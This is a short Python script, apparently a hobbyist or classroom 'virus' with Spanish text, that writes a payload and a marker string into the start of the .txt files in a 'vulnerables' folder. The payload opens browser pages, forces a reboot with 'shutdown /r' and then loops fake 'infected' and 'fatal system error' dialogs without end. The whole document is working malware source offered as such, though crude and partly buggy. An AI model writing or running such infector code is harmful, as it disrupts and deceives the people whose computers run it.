import glob
virus_str = '''
import tkinter as myke
import time
import subprocess
subprocess.Popen("C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe www.youtube.com/watch?v=gwEq0-ACUr8")
subprocess.Popen("C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe infocyte.com/es/blog/2019/05/01/cybersecurity-101-intro-to-the-top-10-common-types-of-cyber-security-attacks/")
subprocess.call('shutdown /r')
from tkinter import messagebox
root = myke.Tk()
root.withdraw()
root.update()
while True:
    myke.messagebox.showwarning('Hola, estas infectado', '!!!INFECTADO!!! jajajajjajjaajajajaajjajajjajaj')
    time.sleep(1)
    myke.messagebox.showerror('Fatal Error Windows - Error deL Sistema',"El sistema ah encontrado un erro fatal en la ejecucion de sus funciones porfavor reinice el equipo de forma manual Urgente")
    time.sleep(1)
'''
infected_str = '##infectadisimo##'
is_infected = False
files = glob.glob('vulnerables/*.txt')
print(files)
for file in files:
    f = open(file, 'r')
    code = f.readlines()
    f.close()
    for line in code:
        if infected_str in line:
            is_infected = True
            break
    if not is_infected:
        new_f = open(file, 'w')
        new_f.write(infected_str +'\n')
        new_f.write(virus_str)
        new_f.writelines(code)
        new_f.close()